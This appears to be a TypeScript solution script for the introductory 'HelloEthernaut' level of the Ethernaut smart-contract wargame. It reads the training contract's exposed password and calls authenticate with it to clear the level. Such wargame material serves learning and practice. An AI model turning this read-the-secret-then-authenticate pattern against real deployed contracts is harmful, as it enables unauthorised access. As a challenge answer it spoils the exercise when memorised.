import { HelloEthernaut } from '../../typechain-types/contracts/levels/HelloEthernaut';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const HELLO_ETHERNAUT_LEVEL_NAME = "HelloEthernaut"

export const helloEthernautAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {
            const contract = await ethereum.getContract<HelloEthernaut>(HELLO_ETHERNAUT_LEVEL_NAME, instanceAddress);

            console.log('Hacking the hidden password of the contract.')
            const pass = await contract.password();

            console.log('Hacked password is: ', pass);
            const tx = await contract.authenticate(pass);
            await tx.wait();
        }
    }
}